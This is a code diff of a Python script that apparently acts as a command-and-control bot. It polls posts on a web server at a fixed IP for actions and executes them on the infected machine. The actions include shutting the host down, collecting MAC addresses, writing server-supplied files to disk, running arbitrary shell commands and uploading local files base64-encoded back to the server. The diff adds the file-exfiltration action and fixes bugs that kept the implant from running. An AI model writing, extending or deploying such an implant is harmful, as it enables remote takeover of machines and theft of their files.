@@ -4,15 +4,17 @@ import re
 import base64
 import string
 import secrets
+import uuid
 from time import sleep
-from BeautifulSoup import BeautifulSoup
+from bs4 import BeautifulSoup
 
-URL='http://10.10.70.101'
+URL='http://192.168.1.10'
 COMPLETE_ACTIONS={}
+UUID = str(uuid.uuid4())
 
 def get_page():
     r = requests.get(URL)
-    return BeautifulSoup(r._content)
+    return BeautifulSoup(r._content, features="html.parser")
 
 def get_posts(soup):
     return soup.findAll("div", {"class": "post-post"})
@@ -28,35 +30,44 @@ def process_actions(posts):
         if a_date in COMPLETE_ACTIONS:
             print("Already ran command {0}".format(a_post))
         else:
-            action = a_post.attrs("data-action",)
-            if action == "shutdown-host"
+            action = a_post.attrs.get("data-action",)
+            if action == "shutdown-host":
                 command = "shutdown /s /t 0"
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 data = proc.stdout.read() + proc.stderr.read()
             elif action == "shutdown-client":
                 exit()
             elif action == "get-mac":
-                command = "ipconfig /all"
+                command = "ipconfig /all | findstr /i \"Physical\""
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 stdout_v = proc.stdout.read() + proc.stderr.read()
-                data = stdout_v.match("Physical")
-            elif action == "upload-file":
-                filebase64 = a_post.getText()
-                fileraw = base64.b64decode(filebase64)
-                filename=secrets.choice(string.ascii_uppercase)+secrets.choice(string.punctuation)\
+                output = stdout_v.split()
+                data = [item for item in output if len(item) == 17]
+            elif action == "download-file":
+                text = a_post.get_text()[2:-1]
+                contents = base64.b64decode(text)
+                filename=secrets.choice(string.ascii_uppercase)\
                     +secrets.choice(string.ascii_lowercase)+secrets.choice(string.ascii_lowercase)\
                     +secrets.choice(string.digits)+secrets.choice(string.digits)+secrets.choice(string.digits)\
                     +secrets.choice(string.ascii_lowercase)
                 with open(filename,'w+b') as f:
-                    f.write(fileraw)
+                    f.write(contents)
                 data = "Saved file as {0}".format(filename)
+            elif action == "upload-file":
+                filename = a_post.get_text()
+                try:
+                    with open(filename,'r+b') as f:
+                        data = base64.b64encode(f.read())
+                except:
+                    data = "Failed top open the file"
             elif action == "shell-command":
                 command = a_post.getText()
                 proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 data = proc.stdout.read() + proc.stderr.read()
             post_id = post.find("a")['href'].split('/')[-1]
-            print('Ran command: {0}\n{1}'.format(a_command, data))
-            payload = {'username': 'bot', 'body': stdout_v, 'post_id': post_id}
+            #print('Ran command: {0}\n{1}'.format(action, str(data)))
+            data = '{0}, {1}, {2}'.format(UUID, action, str(data))
+            payload = {'username': 'bot', 'body': data, 'post_id': post_id, 'action': action}
             status = send_comment(payload)
             print('Status: {0}'.format(status))
             COMPLETE_ACTIONS[a_date] = a_post
